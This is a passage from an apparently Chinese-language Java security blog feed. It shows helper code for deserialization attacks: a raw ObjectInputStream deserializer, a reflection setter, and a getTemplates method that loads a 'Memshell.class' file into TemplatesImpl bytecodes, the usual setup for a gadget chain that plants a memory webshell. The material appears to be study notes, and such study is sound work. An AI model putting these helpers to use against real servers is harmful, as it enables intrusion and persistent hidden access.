class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unser</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">    <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="设置私有属性"><a href="#设置私有属性" class="headerlink" title="设置私有属性"></a>设置私有属性</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="getTemplates"><a href="#getTemplates" class="headerlink" title="getTemplates"></a>getTemplates</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\Memshell.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line"></span><br><span class="line">    setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;序列化反序列化&quot;&gt;&lt;a href=&quot;#序列化反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化反序列化&quot;&gt;&lt;/a&gt;序列化反序列化&lt;/h1&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;</summary>
      
    
    
    
    
  </entry>
  
</feed>
